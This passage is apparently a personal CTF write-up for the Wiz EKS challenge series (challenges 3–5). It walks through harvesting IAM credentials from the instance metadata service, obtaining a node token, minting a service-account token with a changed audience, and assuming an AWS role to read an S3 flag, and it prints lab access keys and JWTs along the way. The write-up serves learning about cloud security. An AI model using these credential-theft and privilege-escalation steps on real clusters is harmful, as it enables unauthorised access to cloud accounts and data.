</blockquote>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">curl</span> <span class="mf">169.254</span><span class="p">.</span><span class="mf">169.254</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">data</span><span class="o">/</span><span class="n">iam</span><span class="o">/</span><span class="n">security</span><span class="o">-</span><span class="n">credentials</span><span class="o">/</span>
 <span class="n">eks</span><span class="o">-</span><span class="n">challenge</span><span class="o">-</span><span class="n">cluster</span><span class="o">-</span><span class="n">nodegroup</span><span class="o">-</span><span class="n">NodeInstanceRole</span></code></pre></figure>

<p><a href="/assets/eks/creds.png" class="popup img-link "><img data-src="/assets/eks/creds.png" alt="creds" class="lazyload" data-proofer-ignore></a></p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">aws</span> <span class="n">ecr</span> <span class="n">get</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">password</span> <span class="o">--</span><span class="n">region</span> <span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mi">1</span> 
 <span class="n">eyJwYXlsb2FkIjoiOXBOZUM4RkczSUtRTm5UT</span><span class="p">[.........]</span><span class="n">cGUiOiJEQVRBX0tFWSIsImV4cGlyYXRpb24iOjE3NTYyODM3ODl9</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">aws</span> <span class="n">ecr</span> <span class="n">get</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">password</span> <span class="o">--</span><span class="n">region</span> <span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span> <span class="n">crane</span> <span class="n">auth</span> <span class="n">login</span> <span class="o">-</span><span class="n">u</span> <span class="n">AWS</span> <span class="o">--</span><span class="n">password</span><span class="o">-</span><span class="n">stdin</span> <span class="mf">688655246681.</span><span class="n">dkr</span><span class="p">.</span><span class="n">ecr</span><span class="p">.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
 <span class="mi">2025</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">26</span> <span class="mi">20</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">46</span> <span class="n">logged</span> <span class="ow">in</span> <span class="n">via</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="p">.</span><span class="n">docker</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">json</span></code></pre></figure>

<p>Now execute the command…</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">crane</span> <span class="n">pull</span> <span class="mf">688655246681.</span><span class="n">dkr</span><span class="p">.</span><span class="n">ecr</span><span class="p">.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">central_repo</span><span class="o">-</span><span class="mi">579</span><span class="n">b0b7</span><span class="o">/</span><span class="n">manifests</span><span class="o">/</span><span class="n">sha256</span><span class="p">:</span><span class="mi">78</span><span class="n">ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4</span> <span class="p">.</span><span class="o">/</span><span class="n">image</span><span class="p">.</span><span class="n">tar</span></code></pre></figure>

<ul>
  <li>After pulling the image, I tried reading the image digests (as I did in challenge 2). In one of the digests, I got the flag, but it was incorrect :(</li>
  <li>So, I looked bit more and read the description again, that says: <code class="language-plaintext highlighter-rouge">inspect the image layers</code></li>
  <li>Then, I looked at <code class="language-plaintext highlighter-rouge">manifest</code> of the image. Found nothing useful.</li>
  <li>Another important document is <code class="language-plaintext highlighter-rouge">config</code>- It contains the runtime metadata for the container.</li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">crane</span> <span class="n">config</span> <span class="mf">688655246681.</span><span class="n">dkr</span><span class="p">.</span><span class="n">ecr</span><span class="p">.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">central_repo</span><span class="o">-</span><span class="mi">579</span><span class="n">b0b7</span><span class="nd">@sha256</span><span class="p">:</span><span class="mi">78</span><span class="n">ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4</span> <span class="o">|</span> <span class="n">jq</span> <span class="p">.</span></code></pre></figure>

<p>And here is the flag…</p>

<p>flag: <code class="language-plaintext highlighter-rouge">wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}</code></p>

<p>In this challenge, we retrieved credentials from the I<code class="language-plaintext highlighter-rouge">nstance Metadata Service (IMDS)</code>.</p>

<h3 id="challenge-4-pod-break"><span class="me-2">Challenge 4: Pod Break</span><a href="#challenge-4-pod-break" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">Description</code>: You’re inside a vulnerable pod on an EKS cluster. Your pod’s service-account has no permissions. Can you navigate your way to access the EKS Node’s privileged service-account?</p>

<ul>
  <li>
    <p>This time, no permissions are sepcified beforehand.</p>
  </li>
  <li>
    <p>First, we will try to check if IAM role is attached to it.</p>
  </li>
</ul>

<p><a href="/assets/eks/iam1.png" class="popup img-link "><img data-src="/assets/eks/iam1.png" alt="iam1" class="lazyload" data-proofer-ignore></a></p>

<ul>
  <li>So, IAM role is present.</li>
  <li>Now, how can we make use of this information?</li>
  <li>The description says: <code class="language-plaintext highlighter-rouge">Can you navigate your way to access the EKS Node's privileged service-account</code>. What is meant by <code class="language-plaintext highlighter-rouge">privilged account</code> here? Refer to this link</li>
</ul>

<p><a href="https://kubernetes.io/docs/reference/access-authn-authz/node/">Node Authorisation</a></p>

<p>When I run this,</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">whoami</span>
  <span class="n">system</span><span class="p">:</span><span class="n">serviceaccount</span><span class="p">:</span><span class="n">challenge4</span><span class="p">:</span><span class="n">service</span><span class="o">-</span><span class="n">account</span><span class="o">-</span><span class="n">challenge4</span></code></pre></figure>

<ul>
  <li>So, we need <code class="language-plaintext highlighter-rouge">system:node</code> instead of <code class="language-plaintext highlighter-rouge">system:serviceaccount</code>.</li>
  <li>I found out this blog: https://blog.calif.io/p/privilege-escalation-in-eks</li>
  <li>So, I needed to generate the token but i didn’t had the cluster-name. I tried googling a bit but couldn’t find of much help. At last, I was forced to use a hint, and it helped me to get the cluster name. 
<a href="/assets/eks/hint.png" class="popup img-link "><img data-src="/assets/eks/hint.png" alt="hint" class="lazyload" data-proofer-ignore></a></li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="o">&gt;</span> <span class="n">aws</span> <span class="n">eks</span> <span class="n">get</span><span class="o">-</span><span class="n">token</span> <span class="o">--</span><span class="n">cluster</span><span class="o">-</span><span class="n">name</span> <span class="n">eks</span><span class="o">-</span><span class="n">challenge</span><span class="o">-</span><span class="n">cluster</span> </code></pre></figure>

<p>It gave me a token and that I will be using to get the privileged role.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">whoami</span> <span class="o">--</span><span class="n">token</span> <span class="sh">"</span><span class="s">$TOKEN</span><span class="sh">"</span> 
  <span class="n">system</span><span class="p">:</span><span class="n">node</span><span class="p">:</span><span class="n">challenge</span><span class="p">:</span><span class="n">ip</span><span class="o">-</span><span class="mi">192</span><span class="o">-</span><span class="mi">168</span><span class="o">-</span><span class="mi">63</span><span class="o">-</span><span class="mf">122.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">compute</span><span class="p">.</span><span class="n">internal</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">get</span> <span class="n">pods</span> <span class="o">--</span><span class="n">token</span> <span class="sh">"</span><span class="s">$TOKEN</span><span class="sh">"</span>
  <span class="n">No</span> <span class="n">resources</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">challenge4</span> <span class="n">namespace</span><span class="p">.</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">get</span> <span class="n">secrets</span> <span class="o">--</span><span class="n">token</span> <span class="sh">"</span><span class="s">$TOKEN</span><span class="sh">"</span>
  <span class="n">NAME</span>        <span class="n">TYPE</span>     <span class="n">DATA</span>   <span class="n">AGE</span>
  <span class="n">node</span><span class="o">-</span><span class="n">flag</span>   <span class="n">Opaque</span>   <span class="mi">1</span>      <span class="mi">666</span><span class="n">d</span></code></pre></figure>

<p><a href="/assets/eks/chal4.png" class="popup img-link "><img data-src="/assets/eks/chal4.png" alt="chal4" class="lazyload" data-proofer-ignore></a></p>

<p>Finally, decode the base64 encoded flag string.</p>

<p>flag: <code class="language-plaintext highlighter-rouge">wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}</code></p>

<h3 id="challenge-5-container-secrets-infrastructure"><span class="me-2">Challenge 5: Container Secrets Infrastructure</span><a href="#challenge-5-container-secrets-infrastructure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">Description</code>: You’ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the <code class="language-plaintext highlighter-rouge">s3access-sa</code> service account, and get the flag?</p>

<p>IAM Policy:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
</pre></td></tr></tbody></table></code></div></div>
<p>Trust Policy:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
</pre></td></tr></tbody></table></code></div></div>
<p>Permissions:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
</pre></td></tr></tbody></table></code></div></div>
<p>In this challenge, some permissions are allowed for listing pods, serviceaccounts, and secrets. The most interesting permission this time is <code class="language-plaintext highlighter-rouge">serviceaccounts/token</code>: means we can even create the token for existing service accounts, effectively escalating privileges.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">whoami</span>
  <span class="n">system</span><span class="p">:</span><span class="n">node</span><span class="p">:</span><span class="n">challenge</span><span class="p">:</span><span class="n">ip</span><span class="o">-</span><span class="mi">192</span><span class="o">-</span><span class="mi">168</span><span class="o">-</span><span class="mi">63</span><span class="o">-</span><span class="mf">122.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">compute</span><span class="p">.</span><span class="n">internal</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">get</span> <span class="n">serviceaccounts</span>
    <span class="n">NAME</span>          <span class="n">SECRETS</span>   <span class="n">AGE</span>
    <span class="n">debug</span><span class="o">-</span><span class="n">sa</span>      <span class="mi">0</span>         <span class="mi">356</span><span class="n">d</span>
    <span class="n">default</span>       <span class="mi">0</span>         <span class="mi">356</span><span class="n">d</span>
    <span class="n">s3access</span><span class="o">-</span><span class="n">sa</span>   <span class="mi">0</span>         <span class="mi">356</span><span class="n">d</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">get</span> <span class="n">sa</span> <span class="n">debug</span><span class="o">-</span><span class="n">sa</span> <span class="o">-</span><span class="n">o</span> <span class="n">yaml</span>
 <span class="n">apiVersion</span><span class="p">:</span> <span class="n">v1</span>
 <span class="n">kind</span><span class="p">:</span> <span class="n">ServiceAccount</span>
 <span class="n">metadata</span><span class="p">:</span>
  <span class="n">annotations</span><span class="p">:</span>
    <span class="n">description</span><span class="p">:</span> <span class="n">This</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">dummy</span> <span class="n">service</span> <span class="n">account</span> <span class="k">with</span> <span class="n">empty</span> <span class="n">policy</span> <span class="n">attached</span>
    <span class="n">eks</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">role</span><span class="o">-</span><span class="n">arn</span><span class="p">:</span> <span class="n">arn</span><span class="p">:</span><span class="n">aws</span><span class="p">:</span><span class="n">iam</span><span class="p">::</span><span class="mi">688655246681</span><span class="p">:</span><span class="n">role</span><span class="o">/</span><span class="n">challengeTestRole</span><span class="o">-</span><span class="n">fc9d18e</span>
  <span class="n">creationTimestamp</span><span class="p">:</span> <span class="sh">"</span><span class="s">2023-10-31T20:07:37Z</span><span class="sh">"</span>
  <span class="n">name</span><span class="p">:</span> <span class="n">debug</span><span class="o">-</span><span class="n">sa</span>
  <span class="n">namespace</span><span class="p">:</span> <span class="n">challenge5</span>
  <span class="n">resourceVersion</span><span class="p">:</span> <span class="sh">"</span><span class="s">671929</span><span class="sh">"</span>
  <span class="n">uid</span><span class="p">:</span> <span class="mi">6</span><span class="n">cb6024a</span><span class="o">-</span><span class="n">c4da</span><span class="o">-</span><span class="mi">47</span><span class="n">a9</span><span class="o">-</span><span class="mi">9050</span><span class="o">-</span><span class="mi">59</span><span class="n">c8c7079904</span></code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">debug-sa</code> has IAM role attached, <code class="language-plaintext highlighter-rouge">challengeTestRole-fc9d18e</code></li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">get</span> <span class="n">sa</span> <span class="n">s3access</span><span class="o">-</span><span class="n">sa</span> <span class="o">-</span><span class="n">o</span> <span class="n">yaml</span>
<span class="n">apiVersion</span><span class="p">:</span> <span class="n">v1</span>
<span class="n">kind</span><span class="p">:</span> <span class="n">ServiceAccount</span>
<span class="n">metadata</span><span class="p">:</span>
  <span class="n">annotations</span><span class="p">:</span>
    <span class="n">eks</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">role</span><span class="o">-</span><span class="n">arn</span><span class="p">:</span> <span class="n">arn</span><span class="p">:</span><span class="n">aws</span><span class="p">:</span><span class="n">iam</span><span class="p">::</span><span class="mi">688655246681</span><span class="p">:</span><span class="n">role</span><span class="o">/</span><span class="n">challengeEksS3Role</span>
  <span class="n">creationTimestamp</span><span class="p">:</span> <span class="sh">"</span><span class="s">2023-10-31T20:07:34Z</span><span class="sh">"</span>
  <span class="n">name</span><span class="p">:</span> <span class="n">s3access</span><span class="o">-</span><span class="n">sa</span>
  <span class="n">namespace</span><span class="p">:</span> <span class="n">challenge5</span>
  <span class="n">resourceVersion</span><span class="p">:</span> <span class="sh">"</span><span class="s">671916</span><span class="sh">"</span>
  <span class="n">uid</span><span class="p">:</span> <span class="mf">86e44</span><span class="n">c49</span><span class="o">-</span><span class="n">b05a</span><span class="o">-</span><span class="mi">4</span><span class="n">ebe</span><span class="o">-</span><span class="mi">800</span><span class="n">b</span><span class="o">-</span><span class="mi">45183</span><span class="n">a6ebbda</span></code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">s3access-sa</code> has IAM role attached, <code class="language-plaintext highlighter-rouge">challengeEksS3Role</code></li>
  <li>Now, check the permissions.</li>
</ul>

<p><a href="/assets/eks/auth_cani.png" class="popup img-link "><img data-src="/assets/eks/auth_cani.png" alt="auth_cani" class="lazyload" data-proofer-ignore></a></p>

<ul>
  <li>
    <p>Only <code class="language-plaintext highlighter-rouge">debug-sa</code> has the permission to create the token. Now, we will create the token with <code class="language-plaintext highlighter-rouge">debug-sa</code> service account and assume the identity of <code class="language-plaintext highlighter-rouge">s3access-sa</code> and then we will read the flag from the bucket. Let’s see how we can execute this.</p>
  </li>
  <li>
    <p>Let’s generate the token first:</p>
  </li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">create</span> <span class="n">token</span> <span class="n">debug</span><span class="o">-</span><span class="n">sa</span>
   <span class="n">eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhMWQxODI0NWVkMzNkOGQzN2ZmNTIzNjg0NWU5OGMzYzRhYzliZGUifQ</span><span class="p">.</span><span class="n">eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc1NjQ5MzQ5NCwiaWF0IjoxNzU2NDg5ODk0LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5IiwianRpIjoiOWI1MDQ3NTAtYTk5MS00ODJhLTkyYmMtOWUwNDU1YzE4NjhjIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U1Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlYnVnLXNhIiwidWlkIjoiNmNiNjAyNGEtYzRkYS00N2E5LTkwNTAtNTljOGM3MDc5OTA0In19LCJuYmYiOjE3NTY0ODk4OTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U1OmRlYnVnLXNhIn0</span><span class="p">.</span><span class="n">TwJMcCfvYfCsH0hbrAm1zSX1tBKW</span><span class="o">-</span><span class="n">KSrkRZC5XJmM8</span><span class="o">-</span><span class="n">I92RXex4hLUlb</span><span class="o">-</span><span class="n">H5pKUFzGaZf_6pgsdQarP6DL8Sw1PuRBdyR_n</span><span class="o">-</span><span class="mi">2</span><span class="n">UC7Wxkx0rfO3Wdp223UiIvY_b4HtXJS3I9l</span><span class="o">-</span><span class="n">Og1a0LHS5YrKooIuePVibwdQ5f9oGF1yoEIrFgMCbPrtSBwjS4v9pZUJ_dx2MXowWvgiIJJLweK_AK4c1n2DLhBVOq2YhHQvOfJ7uA8gRTSa7KRTGmmpEery6aOnCzTb</span><span class="o">-</span><span class="n">_v7JG</span><span class="o">-</span><span class="n">YQAxv7NUMeI2aHNu7M9oAGryE5gwH4Ld9JXA3zqLb</span><span class="o">-</span><span class="n">NIJ</span><span class="o">-</span><span class="n">e_qKvpLCf</span><span class="o">-</span><span class="n">iR4GwStOa1R1rp4Gkvg</span></code></pre></figure>

<ul>
  <li>Now, with this token, let’s assume the identity of <code class="language-plaintext highlighter-rouge">s3access-sa</code></li>
</ul>

<p><a href="/assets/eks/webID.png" class="popup img-link "><img data-src="/assets/eks/webID.png" alt="webID" class="lazyload" data-proofer-ignore></a></p>

<ul>
  <li>Why is this error coming up?
    <blockquote>
      <p>For the audience validation to succeed, the token_reviewer_jwt used by Vault to perform the TokenReview must have the correct audience. If the Kubernetes API server’s –api-audiences flag is not set, the token_reviewer_jwt must have the default audience, such as <code class="language-plaintext highlighter-rouge">https://kubernetes.default.svc</code>. This requirement applies whether Vault is running inside or outside the Kubernetes cluster. <a href="https://support.hashicorp.com/hc/en-us/articles/34458984727443-Audience-parameter-usage-with-kube-auth-in-vault-with-caveats">link</a></p>
    </blockquote>
  </li>
  <li>Let’s verify this statement…</li>
  <li>Open <a href="https://jwt.io">jwt.io</a> and see the decoded payload</li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="p">{</span>
  <span class="sh">"</span><span class="s">aud</span><span class="sh">"</span><span class="p">:</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">https://kubernetes.default.svc</span><span class="sh">"</span>
  <span class="p">],</span>
  <span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1756493494</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">iat</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1756489894</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">iss</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589</span><span class="sh">"</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">jti</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">9b504750-a991-482a-92bc-9e0455c1868c</span><span class="sh">"</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">kubernetes.io</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">namespace</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">challenge5</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">serviceaccount</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
      <span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">debug-sa</span><span class="sh">"</span><span class="p">,</span>
      <span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">6cb6024a-c4da-47a9-9050-59c8c7079904</span><span class="sh">"</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="sh">"</span><span class="s">nbf</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1756489894</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">sub</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">system:serviceaccount:challenge5:debug-sa</span><span class="sh">"</span>
 <span class="p">}</span></code></pre></figure>

<ul>
  <li>In the <code class="language-plaintext highlighter-rouge">aud</code>, we can see the audience type <code class="language-plaintext highlighter-rouge">https://kubernetes.default.svc</code> but according to the trust policy provided, audience type should be <code class="language-plaintext highlighter-rouge">sts.amazonaws.com</code></li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">kubectl</span> <span class="n">create</span> <span class="n">token</span> <span class="n">debug</span><span class="o">-</span><span class="n">sa</span> <span class="o">--</span><span class="n">audience</span> <span class="n">sts</span><span class="p">.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span>
 <span class="n">eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhMWQxODI0NWVkMzNkOGQzN2ZmNTIzNjg0NWU5OGMzYzRhYzliZGUifQ</span><span class="p">.</span><span class="n">eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzU2NDk0NTE1LCJpYXQiOjE3NTY0OTA5MTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJqdGkiOiI1YzFlM2NlMi03MDI3LTRkNjYtYTk3MS1kODNiMzA3ZmVlYzYiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc1NjQ5MDkxNSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ</span><span class="p">.</span><span class="n">kKbtVmYIf4FhC66gL_i_bBpg0TPVl6YyYC9NK140n</span><span class="o">-</span><span class="mi">5</span><span class="n">vCOYih</span><span class="o">-</span><span class="n">npASypvgf2MZhLkiuqkFvnNtHuZcn_ZLxc8aU7Ph5Zr0Ilb_7oRHADq_YsFkOehLEpgzj4A</span><span class="o">-</span><span class="n">zgIK4nW7WsQWhqzGCZFzhknawv6TVHIQAtEwUiz6NAjScGMlQZCzL3AigfOn0lLtQ96QlQ22tpxVpJKTmDYTJsx0DyrUPJpMDzXpncd2YNYfJs50IrU3jPvPNZ3bePsT7ggLU8fqAtMB6f8DlKClFXuJiDZMNGnjXtBtivEzuwE7_ADp</span><span class="o">-</span><span class="n">ErvspzfbLVPfC</span><span class="o">-</span><span class="n">iWFq8AvdANCClnc71JQgajcVCnAkw</span></code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhMWQxO[..........]c71JQgajcVCnAkw"</code></li>
</ul>

<p><a href="/assets/eks/assumed.png" class="popup img-link "><img data-src="/assets/eks/assumed.png" alt="assumed" class="lazyload" data-proofer-ignore></a></p>

<ul>
  <li>Configure aws with the given creds..</li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">export</span> <span class="n">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="sh">"</span><span class="s">ASIA2AVYNEVM5OOAXBK6</span><span class="sh">"</span>
 <span class="o">&gt;</span> <span class="n">export</span> <span class="n">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="sh">"</span><span class="s">Ng6wpD7LjG30pOavNvpmcfXBEouM0KpOHDqsjRnz</span><span class="sh">"</span>
 <span class="o">&gt;</span> <span class="n">export</span> <span class="n">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="sh">"</span><span class="s">IQoJb3JpZ2luX2VjEGoaCXVzLXdlc3QtMSJHM[...........]dUsBCOHX/6RKq58JytdJyCG4Ujm6uNVMu41TG8=</span><span class="sh">"</span></code></pre></figure>

<ul>
  <li>Verify it with the follwing command:</li>
</ul>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">aws</span> <span class="n">sts</span> <span class="n">get</span><span class="o">-</span><span class="n">caller</span><span class="o">-</span><span class="n">identity</span>
 <span class="p">{</span> 
    <span class="sh">"</span><span class="s">UserId</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">AROA2AVYNEVMZEZ2AFVYI:challenge5</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Account</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">688655246681</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Arn</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/challenge5</span><span class="sh">"</span>
 <span class="p">}</span></code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">s3access-sa</code> role has been assumed now… yay!</li>
  <li>
    <p>Now, extract and read the flag from the s3 bucket.</p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag -</code></li>
</ul>

<p>flag: <code class="language-plaintext highlighter-rouge">wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}</code></p>

<p>Finally, I was able to solve all the challenges. They were really well-designed and contributed significantly to my understanding of the security aspects of EKS and Kubernetes.</p>

<p><a href="/assets/eks/certi.png" class="popup img-link "><img data-src="/assets/eks/certi.png" alt="certi" class="lazyload" data-proofer-ignore></a></p>

<p>Thank you for bearing with me, and I hope you liked it. Your suggestions are highly appreciated.</p>

